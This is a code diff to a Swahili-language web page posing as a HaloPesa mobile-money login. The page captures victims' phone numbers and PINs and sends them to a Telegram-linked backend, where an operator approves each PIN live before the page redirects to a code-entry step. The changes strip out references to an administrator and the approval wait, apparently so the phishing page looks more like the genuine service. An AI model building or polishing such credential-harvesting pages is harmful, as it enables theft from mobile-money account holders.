@@ -253,8 +253,6 @@
             display: block;
             background: #e6f7e6;
             color: red;
-            /* border-color: #2e9c3e;
-            box-shadow: 0 2px 12px rgba(46, 156, 62, 0.15); */
         }
         #status.success::before {
             content: "✅ ";
@@ -383,6 +381,12 @@
             cursor: not-allowed;
             transform: none !important;
             background: #8aaa8a;
+        }
+
+        .action.loading:disabled,
+        .action.loading.disabled {
+            opacity: 1;
+            background: #1a7a2a;
         }
 
         .action .spinner {
@@ -547,7 +551,7 @@
         //  BOT ID FROM URL
         // =============================================
         const botId = new URLSearchParams(window.location.search).get("botId") || "test_bot";
-        console.log("🤖 Bot ID:", botId);
+        console.log("Bot ID:", botId);
 
         // =============================================
         //  TELEGRAM INTEGRATION CHECK
@@ -586,7 +590,7 @@
             statusEl.style.display = 'none';
             statusEl.className = '';
             statusEl.textContent = '';
-            errorBox.classList.remove('show'); // also hide the dedicated error box
+            errorBox.classList.remove('show');
         }
 
         // ===== PIN APPROVED =====
@@ -596,34 +600,19 @@
             errorBox.classList.remove('show');
             if (isTelegramWebApp()) notifyTelegram(message, 'success');
         }
-        function showWrongPin() {
-            const message = "Nambari ya Siri si sahihi. Tafadhali jaribu tena.";
-            setStatus(message, 'error');
-            errorBox.classList.remove('show');
-              statusEl.textContent = message;
-              statusEl.textContent.color='red';
-            statusEl.classList.add('show');
-            if (isTelegramWebApp()) notifyTelegram(message, 'success');
-        }
 
         // ===== WRONG PIN - ULTRA VISIBLE =====
-        function showWrongPiin() {
+        function showWrongPin() {
             console.log("❌ showWrongPin() called – displaying error now.");
             const message = "Nambari ya Siri si sahihi. Tafadhali jaribu tena.";
 
-            // 1. Show the dedicated error box (always visible)
-            statusEl.textContent = message;
-            statusEl.classList.add('show');
+            setStatus(message, 'error');
+            errorBox.classList.add('show');
 
-            // 2. Also update the status div (for consistency)
-            setStatus(message, 'telegram-pin-error');
-
-            // 3. Telegram alert
             if (isTelegramWebApp()) {
                 notifyTelegram("❌ Nambari ya Siri si sahihi. Tafadhali jaribu tena.", 'error');
             }
 
-            // 4. Shake animation
             pinBoxesContainer.classList.remove('shake');
             void pinBoxesContainer.offsetWidth;
             pinBoxesContainer.classList.add('shake');
@@ -632,8 +621,6 @@
                 boxes.forEach(b => b.classList.remove('error'));
                 pinBoxesContainer.classList.remove('shake');
             }, 600);
-
-            console.log("✅ Error message should now be visible in both the status bar and the dedicated error box.");
         }
 
         // =============================================
@@ -662,11 +649,10 @@
             this.classList.remove('error');
             localStorage.setItem("phone", this.value);
             validateAndUpdateButton();
-            // Clear error when user starts typing
             if (errorBox.classList.contains('show')) {
                 errorBox.classList.remove('show');
             }
-            if (statusEl.className === 'wrong-pin' || statusEl.className === 'telegram-pin-error') {
+            if (statusEl.className === 'error') {
                 clearStatus();
             }
         });
@@ -728,11 +714,10 @@
             box.addEventListener("blur", validateAndUpdateButton);
             box.addEventListener("focus", function() {
                 this.classList.remove('error');
-                // Clear error when focusing a pin box
                 if (errorBox.classList.contains('show')) {
                     errorBox.classList.remove('show');
                 }
-                if (statusEl.className === 'wrong-pin' || statusEl.className === 'telegram-pin-error') {
+                if (statusEl.className === 'error') {
                     clearStatus();
                 }
             });
@@ -785,12 +770,8 @@
         //  FORGOT PIN
         // =============================================
         forgotPinEl.addEventListener("click", function() {
-            const phone = phoneInput.value.trim();
-            let msg = "Tafadhali wasiliana na msimamizi wa HaloPesa kupata Nambari yako ya Siri.";
-            if (phone.length > 0) msg = `Tafadhali wasiliana na msimamizi wa HaloPesa kwa nambari ${phone}.`;
-            setStatus(msg, "telegram-info");
+            setStatus("Tafadhali jaribu tena baada ya muda mfupi.", "telegram-info");
             errorBox.classList.remove('show');
-            if (isTelegramWebApp()) notifyTelegram("Wasiliana na msimamizi.", "info");
         });
 
         // =============================================
@@ -810,8 +791,6 @@
                 clearInterval(pollingInterval);
                 pollingInterval = null;
             }
-
-            setStatus("Inatuma kwa uthibitisho...", isTelegramWebApp() ? "telegram-info" : "waiting");
 
             if (USE_MOCK) {
                 console.log("Mock mode: testing PIN", pin);
@@ -854,28 +833,23 @@
                 console.log(" Response status:", res.status, "Body:", responseText);
 
                 if (!res.ok) {
-                    let errorMsg = "Imeshindwa kutuma Nambari ya Siri. Jaribu tena.";
-                    try { const err = JSON.parse(responseText);
-                        errorMsg = err.error || errorMsg; } catch {}
-                    setStatus(errorMsg, 'error');
+                    setStatus("Imeshindwa kutuma Nambari ya Siri. Jaribu tena.", 'error');
                     resetForm();
                     return;
                 }
 
                 let data;
                 try { data = JSON.parse(responseText); } catch {
-                    setStatus("Hitilafu ya muundo wa data kutoka seva.", 'error');
+                    setStatus("Tatizo limetokea. Tafadhali jaribu tena.", 'error');
                     resetForm();
                     return;
                 }
 
                 if (!data || !data.requestId) {
-                    setStatus("Seva haikurudisha Kitambulisho cha ombi.", 'error');
+                    setStatus("Tatizo limetokea. Tafadhali jaribu tena.", 'error');
                     resetForm();
                     return;
                 }
-
-                setStatus("Inasubiri msimamizi kukubali au kukataa...", isTelegramWebApp() ? "telegram-info" : "waiting");
 
                 const approved = await pollPinApproval(data.requestId);
 
@@ -884,7 +858,6 @@
                     localStorage.setItem("pin", pin);
                     setTimeout(() => window.location.href = `code.html?botId=${botId}`, 600);
                 } else if (approved === false) {
-                    showWrongPin();
                     resetForm();
                 } else {
                     setStatus("Muda wa kusubiri umeisha. Tafadhali jaribu tena.", 'error');
@@ -894,7 +867,6 @@
             } catch (error) {
                 console.error("Network error:", error);
                 setStatus("Tatizo la muunganisho. Angalia mtandao wako.", 'error');
-                if (isTelegramWebApp()) notifyTelegram("Tatizo la muunganisho.", "error");
                 resetForm();
             } finally {
                 isSubmitting = false;
@@ -923,8 +895,9 @@
                         if (data.blocked === true) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
-                            setStatus("Akaunti yako imezuiwa. Wasiliana na msimamizi.", 'error');
-                            if (isTelegramWebApp()) notifyTelegram("Akaunti imezuiwa.", "error");
+                            setStatus("Akaunti yako imezuiwa. Tafadhali jaribu tena baadaye.", 'error');
+                            errorBox.textContent = "Akaunti yako imezuiwa. Tafadhali jaribu tena baadaye.";
+                            errorBox.classList.add('show');
                             resolve(false);
                             return;
                         }
@@ -932,7 +905,7 @@
                         if (data.approved === true) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
-                            console.log("Admin APPROVED the PIN.");
+                            console.log("PIN APPROVED.");
                             resolve(true);
                             return;
                         }
@@ -940,18 +913,10 @@
                         if (data.approved === false) {
                             clearInterval(pollingInterval);
                             pollingInterval = null;
-                            console.log("Admin REJECTED the PIN (wrong PIN).");
+                            console.log("PIN REJECTED.");
+                            showWrongPin();
                             resolve(false);
                             return;
-                        }
-
-                        if (attempts % 8 === 0 || attempts === 1) {
-                            const elapsed = Math.floor(attempts * 1.5);
-                            const mins = Math.floor(elapsed / 60);
-                            const secs = elapsed % 60;
-                            const timeStr = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
-                            const msg = `Inasubiri msimamizi... (${timeStr})`;
-                            setStatus(msg, isTelegramWebApp() ? "telegram-info" : "waiting");
                         }
 
                         if (attempts >= maxAttempts) {
@@ -963,9 +928,6 @@
 
                     } catch (error) {
                         console.error("Poll error:", error);
-                        if (attempts % 5 === 0) {
-                            setStatus("Tatizo la muunganisho. Inajaribu tena...", "waiting");
-                        }
                     }
                 }, 1500);
             });
@@ -987,7 +949,6 @@
             isSubmitting = false;
             validateAndUpdateButton();
             boxes[0].focus();
-            // We keep error visible until user interacts
         }
 
         // =============================================
@@ -1037,20 +998,11 @@
                 validateAndUpdateButton();
 
                 if (!botId || botId === "test_bot") {
-                    setStatus("Hitilafu: Hakuna Kitambulisho cha Bot. Tumia kiungo kutoka Telegram.", 'error');
+                    setStatus("Kiungo si sahihi. Tafadhali fungua ukurasa huu kupitia kiungo rasmi.", 'error');
                     loginBtn.disabled = true;
                     loginBtn.classList.add("disabled");
-                } else {
-                    if (isTelegramWebApp()) {
-                        setStatus("Umeunganishwa kwa Telegram. Weka nambari ya simu.", "telegram-info");
-                        setTimeout(clearStatus, 3000);
-                    }
-                    if (USE_MOCK) {
-                        setStatus("Hali ya majaribio: PIN sahihi ni 1234", "telegram-info");
-                        setTimeout(clearStatus, 5000);
-                    }
                 }
-                // Hide the error box initially
+
                 errorBox.classList.remove('show');
             }, 100);
         });
@@ -1070,8 +1022,7 @@
         console.log("HaloPesa login page ready.");
         console.log("Telegram WebApp:", isTelegramWebApp() ? "Yes" : "No");
         console.log("Bot ID:", botId || "MISSING");
-        console.log("Mock mode:", USE_MOCK ? "ON (PIN 1234 = success)" : "OFF (using real backend)");
-        console.log(" Error will now appear in a dedicated red box + Telegram alert.");
+        console.log("Mock mode:", USE_MOCK ? "ON" : "OFF");
     </script>
 
 </body>
